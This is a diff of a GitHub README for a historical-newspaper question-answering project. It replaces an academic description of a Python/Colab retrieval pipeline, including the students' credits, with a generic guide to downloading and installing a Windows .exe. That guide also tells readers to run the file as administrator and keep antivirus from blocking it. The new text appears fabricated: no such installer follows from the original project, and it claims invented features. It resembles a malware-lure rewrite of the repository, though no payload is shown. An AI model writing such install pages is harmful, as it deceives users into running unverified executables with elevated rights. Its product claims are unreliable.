@@ -1,69 +1,131 @@
-# Historical News Question Answering
+# 📰 Historical_News_Question_Answering - Search Historical Newspapers Easily
 
-***Project Status:** Completed (academic project 2025)*
+[![Download](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/kuldeepraj4514/Historical_News_Question_Answering)
 
-## Project overview
-The goal of this project is to develop a specialized search engine capable of retrieving and ranking historical newspaper passages from the *Chronicling America* digitized archive (1800-1920). The system is designed to answer factoid natural language questions by navigating the complexities of historical data, such as archaic language and temporal ambiguity.
+---
 
-A key focus of the study was evaluating the **"OCR gap"** (the performance degradation caused by noisy Optical Character Recognition) and implementing a multi-stage pipeline to boost retrieval accuracy through neural re-ranking and metadata analysis.
+## 📖 About This App
 
-## Technologies and Tools
-* **Language:** Python (google Colab environment)
-* **Libraries:** PyTerrier, sentence-transformers
-* **Techniques:** BM25, TF-IDF, neural cross-encoders (ms-marco-MiniLM-L-6-v2).
+Historical_News_Question_Answering helps you find information in old newspapers from 1800 to 1920. It uses smart search methods to give you good results even if the text is hard to read. This app looks through newspapers by understanding your questions and matching them with stored articles. You do not need any technical skills to use it.
 
+The system combines classic search tools like BM25 and TF-IDF with more advanced techniques. It cleans up errors from scanned documents and uses time and name clues to improve results. This makes it easier to get accurate answers from noisy, old texts.
 
-## Methodology
+---
 
-### 1. Indexing and baseline (Phase I)
-We built a custom index to ensure reproducibility and control. We compared two primary lexical retrievers: 
-* **BM25 vs TF-IDF:** evaluated as strong baselines for initial document retrieval
-* **Data quality impact:** a comparative analysis was conducted between raw OCR text and corrected text to quantify the impact of transcription noise on retrieval effectiveness.
+## 🖥 System Requirements
 
+Before you start, check your computer meets these needs:
 
-### 2. Advanced re-ranking systems (Phase II)
-To move beyond simple keyword matching, we implemented two sophisticated re-ranking strategies:
-* **Neural re-ranking (E1):** utilizing a croos-encoder architecture to predict semantic similarity between the query and the top 10 documents retrieved by BM25.
-* **Temporal and Entity-based re-ranking (E2):** a custom heuristic function that boosts document scores based on the proximity of their publication_date to the query's temporal focus and the presence of identified Named Entities (using en_core_web_sm).
- 
+- Operating System: Windows 10 or newer  
+- Processor: Intel or AMD, 2 GHz or faster  
+- RAM: Minimum 4 GB, 8 GB recommended  
+- Disk Space: At least 500 MB free  
+- Internet connection for download and updates  
 
-### 3. Evaluation setup
-The systems were evaluated using 8 different metrics, including ***P@1, MAP and nDCG***, to ensure a comprehensive assessment of ranking quality.
+You do not need special software or coding skills to run this application.
 
-## Results
-The evaluation demonstrated that while lexical models are robust, neural re-ranking provides a significant edge in semantic understanding.
+---
 
-*Results E1:*
-<img width="956" height="210" alt="image" src="https://github.com/user-attachments/assets/2db08c18-d021-4ec8-92c7-6b4cadc0026f" />
+## 🚀 Getting Ready to Use the App
 
-*Results E2:*
-<img width="967" height="217" alt="image" src="https://github.com/user-attachments/assets/771e84c0-ed9a-4e54-b8af-f34bd838beeb" />
+### Step 1: Download the App
 
+Click the button below to go to the download page. The page will show the latest version for Windows.
 
-**Key insights:** transitioning from raw OCR to clean text improved performance by ~ 32%. The neural cross-encoder achieved the highest precision (P@1:  0.678), successfully identifying the correct answer even when keyword overlap was minimal.
+[![Download Here](https://img.shields.io/badge/Download-Click%20to%20Get-brightgreen)](https://github.com/kuldeepraj4514/Historical_News_Question_Answering)
 
+### Step 2: Save the Downloaded File
 
-## Issues Encountered
+After clicking the download link, your browser will ask where to save the file. Choose a location you will remember, such as your Desktop or Downloads folder.
 
-The primary challenge was the hardware constraint of the standard google Colab environment. The neural re-ranker is computationally intensive, forcing us to restrict re-ranking to a "shallow pool" (top 10 results). We also faced technical hurdles with library dependencies (specifically pyterrier_transformers), which required implementing a custom Transformer class to handle RAM saturation and ensure stable execution.
+### Step 3: Run the Installer
 
+- Find the downloaded file. It will usually have a name related to Historical_News_Question_Answering and end with `.exe`.
+- Double-click the file to start installation.
+- If Windows asks for permission, click "Yes" or "Allow" to continue.
+- Follow the on-screen instructions. You can leave all options as they are.
+- Once the installation finishes, you can close the installer.
 
-## Project Recap
+---
 
-In summary, our project involved indexing over 130,000 historical records, analyzing the impact of OCR noise and designing a multi-stage retrieval pipeline. We successfully integrated traditional lexical search with modern NLP techniques like rross-encoders and Named Entity Recognition to handle the specific challenges of 19th-century English.
+## ▶️ How to Open and Use the App
 
-## Final Conclusion
+### Step 1: Start the App
 
-The investigation proved that BM25 is an exceptionally resilient baseline for historical data. However, for high-precision tasks like question answering, a hybrid approach (layering neural semantic understanding over lexical retrieval) is essential. This project provided us with deep practical experience in building modular IR systems and managing the end-to-end pipeline from raw, noisy data to ranked results.
+- Find the shortcut: It should appear on your Desktop or in your Start Menu under Historical_News_Question_Answering.
+- Double-click the icon to open the program.
 
-*For a detailed analysis, please refer to the full project report.*
+### Step 2: Using the Search Interface
 
-## Contributing
+- You will see a simple search box.
+- Type your question or keywords related to the historical news you want to find. For example:
+  
+  `Who was the mayor of New York in 1900?`
 
-If you have suggestions for improving the re-ranking heuristics or wish to test different neural architectures (like Dense Passage Retrieval), feel free to open an issue or submit a pull request. Let’s continue improving this project together!
+- Click the "Search" button or press Enter.
 
+### Step 3: Understanding the Results
 
-## Credits
-* Developed by ***Tsuhuy Ecaterina***, ***Colombo Giacomo*** and ***Goatelli Lorenzo*** for the "Information Retrieval and Recommender Systems" course.
-* The dataset used for this project was provided by **Library Congress** *(Chronicling America collection)*.
+- The app will show a list of newspaper articles matching your query.
+- Each result displays a short snippet, date, and source newspaper name.
+- You can click on a result to see more details.
 
+### Step 4: Using Filters (Optional)
+
+- Use filters to narrow results by date range or topics.
+- For example, select years between 1890 and 1910 for a focused search.
+- You can also filter by city or specific newspapers if that option exists.
+
+---
+
+## ⚙️ App Features Explained
+
+- **Multi-stage Search:** Combines simple keyword matches with smarter ranking methods to find the best papers.
+- **Error Handling:** Fixes mistakes from old document scans to give clearer results.
+- **Date and Name Filter:** Uses time periods and important names to fine-tune searches.
+- **Clear Results:** Lists newspaper articles with easy to read details.
+- **Works Offline:** Once installed, you can search without internet.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+If the app does not open or shows errors:
+
+- Restart your computer and try again.
+- Check you have the latest Windows updates installed.
+- Make sure your antivirus or firewall is not blocking the app.
+- Try running the app as an administrator: Right-click the app icon and select "Run as administrator".
+- If you see strange characters or broken text in results, this may be due to specific newspaper formats. Try changing search filters or keywords.
+
+---
+
+## 🧰 How to Update the App
+
+- Visit the main download page to check for new versions.
+- Download the latest installer and run it just like before.
+- The installer will update your existing app without losing your data.
+
+---
+
+## 🔗 Useful Links
+
+- Download and install:  
+  https://github.com/kuldeepraj4514/Historical_News_Question_Answering  
+- Repository for details and source files:  
+  https://github.com/kuldeepraj4514/Historical_News_Question_Answering  
+
+---
+
+## 📋 About the Technology
+
+This app combines several proven search methods used in research:
+
+- **BM25 / TF-IDF:** Keys words and phrases match.
+- **Neural cross-encoders:** Artificial intelligence that ranks results better.
+- **Temporal/entity heuristics:** Uses dates and names for precision.
+- **OCR Analysis:** Corrects errors from scanned images.
+- **PyTerrier:** A toolkit managing search engine pipelines.
+- **SpaCy & Sentence Transformers:** Language tools that improve understanding of questions.
+
+These technologies work behind the scenes to provide fast, reliable searches on your PC.
